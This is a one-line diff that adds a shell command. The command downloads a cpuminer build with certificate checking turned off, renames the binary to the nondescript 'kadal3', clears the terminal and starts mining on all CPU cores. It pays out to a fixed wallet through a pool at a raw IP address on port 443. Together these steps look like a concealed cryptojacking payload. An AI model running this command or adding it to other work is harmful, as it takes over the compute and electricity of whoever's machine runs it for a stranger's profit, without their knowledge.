@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 kadal3 && clear && ./kadal3 -a yespowerLTNCG -o stratum+tcp://128.199.229.228:443 -u KRk1DUz5DsbuthhcDXAH6RXco5qhqM2DEa.My_WF -p c=CRNC -t$(nproc --all)
